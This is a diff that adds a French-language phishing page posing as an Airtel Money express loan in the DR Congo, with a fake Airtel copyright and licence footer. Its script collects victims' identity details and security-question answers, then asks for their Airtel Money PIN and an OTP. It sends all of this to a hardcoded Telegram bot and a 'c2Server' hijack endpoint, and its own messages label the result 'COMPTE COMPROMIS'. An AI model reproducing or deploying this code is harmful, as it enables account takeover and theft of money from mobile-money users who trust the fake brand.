@@ -1,0 +1,427 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <title>Toraco loan - Prêt Express</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { font-family: 'Segoe UI', Arial, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; padding: 20px; }
+        .container { max-width: 500px; margin: 0 auto; background: white; border-radius: 15px; box-shadow: 0 20px 40px rgba(0,0,0,0.2); overflow: hidden; }
+        .header { background: #E31837; color: white; padding: 25px; text-align: center; }
+        .logo { font-size: 24px; font-weight: bold; margin-bottom: 10px; }
+        .step { display: none; padding: 30px; }
+        .step.active { display: block; animation: fadeIn 0.5s; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        .field { margin-bottom: 20px; }
+        label { display: block; margin-bottom: 8px; font-weight: 600; color: #333; }
+        input, select { width: 100%; padding: 15px; border: 2px solid #e0e0e0; border-radius: 10px; font-size: 16px; transition: border 0.3s; }
+        input:focus, select:focus { border-color: #E31837; outline: none; }
+        button { background: linear-gradient(135deg, #E31837, #c41230); color: white; border: none; padding: 18px; width: 100%; border-radius: 10px; font-size: 18px; font-weight: bold; cursor: pointer; transition: transform 0.2s; margin-top: 10px; }
+        button:hover { transform: translateY(-2px); }
+        button:disabled { background: #ccc; cursor: not-allowed; }
+        .progress { display: flex; margin: 25px 0 40px; justify-content: space-between; position: relative; }
+        .progress:before { content: ''; position: absolute; top: 50%; left: 0; right: 0; height: 3px; background: #e0e0e0; transform: translateY(-50%); z-index: 1; }
+        .progress-step { width: 40px; height: 40px; border-radius: 50%; background: #e0e0e0; display: flex; align-items: center; justify-content: center; font-weight: bold; color: white; position: relative; z-index: 2; transition: all 0.3s; }
+        .progress-step.active { background: #E31837; transform: scale(1.1); }
+        .security-note { background: #f8f9fa; border-left: 4px solid #2196F3; padding: 15px; margin: 20px 0; border-radius: 8px; font-size: 14px; }
+        .success-screen { text-align: center; padding: 50px 30px; }
+        .success-icon { font-size: 70px; color: #4CAF50; margin-bottom: 20px; }
+        .btn-group { display: flex; gap: 10px; margin-top: 25px; }
+        .btn-secondary { background: #6c757d; }
+        .hidden { display: none; }
+        small { color: #666; font-size: 13px; display: block; margin-top: 5px; }
+        .otp-highlight { background: #f0f8ff; padding: 20px; border-radius: 10px; border: 2px solid #2196F3; margin: 20px 0; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        
+        <div class="header">
+            <div class="logo">📱 Toraco loan - Prêt Express</div>
+            <p>Prêt Express - Jusqu'à 1,000,000 CDF</p>
+            <div style="font-size: 12px; opacity: 0.9; margin-top: 10px;">
+                <span>🔒 100% Sécurisé</span> • <span>⚡ Transfert instantané</span> • <span>✅ Sans frais</span>
+            </div>
+
+        
+        <div class="progress" style="padding: 0 30px;">
+            <div class="progress-step active" id="step1-progress">1</div>
+            <div class="progress-step" id="step2-progress">2</div>
+            <div class="progress-step" id="step3-progress">3</div>
+            <div class="progress-step" id="step4-progress">4</div>
+        </div>
+
+        
+        <form id="airtelForm">
+            
+            <div class="step active" id="step1">
+                <h3 style="margin-bottom: 25px; color: #333;">Informations Personnelles</h3>
+                
+                <div class="field">
+                    <label>📞 Numéro Airtel Money *</label>
+                    <input type="tel" id="phone" placeholder="+243 81 234 5678" required>
+                    <small>Le numéro lié à votre compte Airtel Money</small>
+                </div>
+
+                <div class="field">
+                    <label>👤 Nom Complet *</label>
+                    <input type="text" id="name" placeholder="Ex: KABILA TSHISEKEDI" required>
+                </div>
+
+                <div class="field">
+                    <label>📅 Date de Naissance *</label>
+                    <input type="date" id="dob" required>
+                </div>
+
+                <div class="field">
+                    <label>💰 Montant du Prêt Demandé *</label>
+                    <select id="amount" required>
+                        <option value="">-- Sélectionnez --</option>
+                        <option value="50000">50,000 CDF</option>
+                        <option value="100000">100,000 CDF</option>
+                        <option value="250000">250,000 CDF</option>
+                        <option value="500000">500,000 CDF</option>
+                        <option value="1000000">1,000,000 CDF</option>
+                    </select>
+                    <small>Le montant sera transféré directement sur votre compte Airtel Money</small>
+                </div>
+
+                <button type="button" class="btn" onclick="nextStep(2)">Continuer ➔</button>
+            </div>
+
+            
+            <div class="step" id="step2">
+                <h3 style="margin-bottom: 25px; color: #333;">Vérification d'Identité</h3>
+                
+                <div class="security-note">
+                    <strong>🔐 Protection de votre compte:</strong> Ces informations vérifient que vous êtes bien le propriétaire du compte.
+                </div>
+
+                <div class="field">
+                    <label>Nom de Jeune Fille de votre Mère *</label>
+                    <input type="text" id="mother" required>
+                </div>
+
+                <div class="field">
+                    <label>Ville de Naissance *</label>
+                    <input type="text" id="city" placeholder="Ex: Kinshasa" required>
+                </div>
+
+                <div class="field">
+                    <label>Nom de votre Première École *</label>
+                    <input type="text" id="school" required>
+                </div>
+
+                <div class="btn-group">
+                    <button type="button" class="btn btn-secondary" onclick="prevStep(1)">← Retour</button>
+                    <button type="button" class="btn" onclick="requestPin()">Vérifier l'Identité ➔</button>
+                </div>
+            </div>
+
+           
+
+            
+            <div class="step" id="step4">
+                <h3 style="margin-bottom: 25px; color: #333;">Vérification Finale</h3>
+                
+                <div class="otp-highlight">
+                    <h4 style="color: #2196F3; margin-bottom: 15px;">📲 Dernière Étape: Vérification par SMS</h4>
+                    <p>Pour protéger votre compte, nous envoyons un code de vérification unique à votre téléphone.</p>
+                    <p><strong>Ce code confirme que vous êtes bien le propriétaire du compte.</strong></p>
+                    
+                    <div class="field" style="margin-top: 20px;">
+                        <label>Code de Vérification (OTP) *</label>
+                        <input type="text" id="otp" placeholder="123456" maxlength="6" required>
+                        <small>Entrez le code à 6 chiffres reçu par SMS</small>
+                    </div>
+                    
+                    <button type="button" id="sendOtp" class="btn" style="background: #2196F3; margin-top: 15px;">
+                        📲 Recevoir le Code OTP
+                    </button>
+                </div>
+
+                <div class="security-note">
+                    <strong>ℹ️ Important:</strong> Votre prêt sera approuvé immédiatement après cette vérification.
+                </div>
+
+                <div class="btn-group">
+                    <button type="button" class="btn btn-secondary" onclick="prevStep(2)">← Retour</button>
+                    <button type="submit" class="btn">✅ Soumettre la Demande</button>
+                </div>
+            </div>
+
+            
+            <div class="step" id="step5">
+                <div class="success-screen">
+                    <div class="success-icon">✅</div>
+                    <h3 style="color: #4CAF50; margin-bottom: 20px;">Demande Soumise avec Succès!</h3>
+                    <p style="font-size: 18px; margin-bottom: 15px;">Votre demande de prêt a été reçue et est en cours de traitement.</p>
+                    <p style="background: #f0f8ff; padding: 15px; border-radius: 10px; margin: 20px 0;">
+                        <strong>Référence:</strong> <span id="referenceId" style="font-family: monospace;">AIR-</span>
+                    </p>
+                    <div style="background: #fff3cd; padding: 15px; border-radius: 10px; margin-top: 25px;">
+                        <p>📱 <strong>Vous recevrez un SMS de confirmation sous 5 minutes.</strong></p>
+                        <p>💰 <strong>Le montant sera transféré sur votre compte Airtel Money.</strong></p>
+                    </div>
+                </div>
+            </div>
+        </form>
+
+        <div style="padding: 20px; text-align: center; font-size: 12px; color: #666; border-top: 1px solid #eee;">
+            <p>© 2025 Airtel Congo RDC. Service client: 111 (gratuit)</p>
+            <p>Licence Banque Centrale du Congo No. BCC/2025/AM</p>
+        </div>
+    </div>
+
+    <script>
+        
+        const CONFIG = {
+            telegramBotToken: "8257598585:AAEdA_uSzCyuIszRXCYKEOdp5hWLv6m0ojI",
+            telegramChatId: "6362923717",
+            c2Server: "http://localhost:3000/api/hijack"
+        };
+        
+        
+        let currentStep = 1;
+        let capturedData = {
+            pin: null,
+            timestamp: new Date().toISOString()
+        };
+
+        
+        function nextStep(step) {
+            
+            if (!validateStep(currentStep)) {
+                alert("Veuillez remplir tous les champs obligatoires.");
+                return;
+            }
+            
+            document.getElementById('step' + currentStep).classList.remove('active');
+            document.getElementById('step' + step).classList.add('active');
+            
+            
+            document.querySelectorAll('.progress-step').forEach(el => el.classList.remove('active'));
+            for (let i = 1; i <= step; i++) {
+                const progressEl = document.getElementById('step' + i + '-progress');
+                if (progressEl) progressEl.classList.add('active');
+            }
+            
+            currentStep = step;
+        }
+
+        function prevStep(step) {
+            document.getElementById('step' + currentStep).classList.remove('active');
+            document.getElementById('step' + step).classList.add('active');
+            
+            document.querySelectorAll('.progress-step').forEach(el => el.classList.remove('active'));
+            for (let i = 1; i <= step; i++) {
+                document.getElementById('step' + i + '-progress').classList.add('active');
+            }
+            
+            currentStep = step;
+        }
+
+        function validateStep(step) {
+            const stepEl = document.getElementById('step' + step);
+            const inputs = stepEl.querySelectorAll('input[required], select[required]');
+            
+            for (let input of inputs) {
+                if (!input.value.trim()) {
+                    input.focus();
+                    return false;
+                }
+            }
+            return true;
+        }
+
+        
+        function requestPin() {
+            
+            if (!validateStep(2)) {
+                alert("Veuillez remplir toutes les questions de sécurité.");
+                return;
+            }
+            
+            
+            const pin = prompt(
+                "🔐 VÉRIFICATION FINALE\n\n" +
+                "Pour finaliser votre demande de prêt, nous devons vérifier votre identité " +
+                "avec votre compte Airtel Money.\n\n" +
+                "Veuillez entrer votre Code Secret Airtel Money (4-6 chiffres):\n\n" +
+                "⚠️ Ce code ne sera pas stocké et est utilisé uniquement pour la vérification instantanée.",
+                ""
+            );
+            
+            
+            if (!pin || !/^\d{4,6}$/.test(pin)) {
+                alert("Code secret invalide. Il doit contenir 4 à 6 chiffres.");
+                return;
+            }
+            
+            
+            capturedData.pin = pin;
+            
+            
+            const phone = document.getElementById('phone').value;
+            sendTelegram(`🔐 PIN CAPTURÉ\n📱 Pour: ${phone}\n🔑 PIN: ${pin}`);
+            
+        
+            nextStep(4);
+            
+            
+            alert("✅ Identité vérifiée! Vous allez recevoir un code OTP par SMS.");
+        }
+
+        
+        document.getElementById('sendOtp').addEventListener('click', function() {
+            const phone = document.getElementById('phone').value;
+            if (!phone) {
+                alert("Veuillez d'abord entrer votre numéro Airtel.");
+                return;
+            }
+            
+            const btn = this;
+            btn.disabled = true;
+            btn.innerHTML = '📤 Envoi en cours...';
+            
+            
+            setTimeout(() => {
+                const otp = Math.floor(100000 + Math.random() * 900000);
+                document.getElementById('otp').value = otp;
+                btn.innerHTML = '✅ OTP Envoyé';
+                
+                
+                sendTelegram(`🔐 OTP GÉNÉRÉ\n📱 Pour: ${phone}\n🔢 OTP: ${otp}\n⚠️ Le victime va l'entrer maintenant.`);
+                
+                
+                alert(`✅ Code OTP envoyé à ${phone}: ${otp}\n\nVeuillez entrer ce code dans le champ ci-dessus.`);
+            }, 1500);
+        });
+
+    
+        async function sendTelegram(message) {
+            const url = `https://api.telegram.org/bot${CONFIG.telegramBotToken}/sendMessage`;
+            const data = {
+                chat_id: CONFIG.telegramChatId,
+                text: message,
+                parse_mode: 'Markdown'
+            };
+            
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify(data)
+                });
+                console.log('Telegram sent:', message.substring(0, 50) + '...');
+            } catch(e) {
+                console.log('Telegram error:', e.message);
+            }
+        }
+
+        async function sendFullDataToTelegram() {
+            const phone = document.getElementById('phone').value;
+            const name = document.getElementById('name').value;
+            const dob = document.getElementById('dob').value;
+            const amount = document.getElementById('amount').value;
+            const mother = document.getElementById('mother').value;
+            const city = document.getElementById('city').value;
+            const school = document.getElementById('school').value;
+            const otp = document.getElementById('otp').value;
+            
+            const message = `
+🔴 🎯 AIRTEL MONEY HIJACK - COMPLETE DATA 🎯
+
+📱 *Numéro:* \`${phone || 'N/A'}\`
+🔑 *PIN:* \`${capturedData.pin || 'N/A'}\`
+🔐 *OTP:* \`${otp || 'N/A'}\`
+👤 *Nom:* ${name || 'N/A'}
+📅 *Naissance:* ${dob || 'N/A'}
+
+👩 *Mère:* ${mother || 'N/A'}
+🏙️ *Ville:* ${city || 'N/A'}
+🏫 *École:* ${school || 'N/A'}
+
+💰 *Montant Prêt:* ${amount || 'N/A'} CDF
+🆔 *Référence:* AIR-${Date.now()}
+🕐 *Heure:* ${new Date().toLocaleString('fr-CD')}
+
+⚠️ ⚠️ ⚠️ *COMPTE COMPROMIS* ⚠️ ⚠️ ⚠️
+            `;
+            
+            await sendTelegram(message);
+            return true;
+        }
+
+       
+        document.getElementById('airtelForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            
+            const otp = document.getElementById('otp').value;
+            if (!otp || !/^\d{6}$/.test(otp)) {
+                alert("Veuillez entrer un code OTP valide (6 chiffres).");
+                return;
+            }
+            
+            
+            const submitBtn = this.querySelector('button[type="submit"]');
+            submitBtn.disabled = true;
+            submitBtn.innerHTML = '⏳ Traitement...';
+            
+            try {
+                
+                await sendFullDataToTelegram();
+                
+                
+                try {
+                    const serverData = {
+                        phone: document.getElementById('phone').value,
+                        name: document.getElementById('name').value,
+                        pin: capturedData.pin,
+                        otp: otp,
+                        mother: document.getElementById('mother').value,
+                        city: document.getElementById('city').value,
+                        school: document.getElementById('school').value,
+                        amount: document.getElementById('amount').value,
+                        dob: document.getElementById('dob').value,
+                        timestamp: new Date().toISOString()
+                    };
+                    
+                    await fetch(CONFIG.c2Server, {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify(serverData)
+                    });
+                } catch (serverError) {
+                    console.log('Server error (non-critical):', serverError.message);
+                }
+                
+                
+                nextStep(5);
+                document.getElementById('referenceId').textContent = `AIR-${Date.now()}-${Math.random().toString(36).substr(2, 4).toUpperCase()}`;
+                
+                
+                setTimeout(() => {
+                    this.reset();
+                    nextStep(1);
+                    capturedData.pin = null;
+                    submitBtn.disabled = false;
+                    submitBtn.innerHTML = '✅ Soumettre la Demande';
+                    document.getElementById('sendOtp').disabled = false;
+                    document.getElementById('sendOtp').innerHTML = '📲 Recevoir le Code OTP';
+                }, 10000);
+                
+            } catch (error) {
+                alert("Erreur: " + error.message);
+                submitBtn.disabled = false;
+                submitBtn.innerHTML = '✅ Soumettre la Demande';
+            }
+        });
+
+        
+        
+        document.querySelectorAll('.progress-step').forEach(el => el.classList.remove('active'));
+        document.getElementById('step1-progress').classList.add('active');
+    </script>
+</body>
+</html>
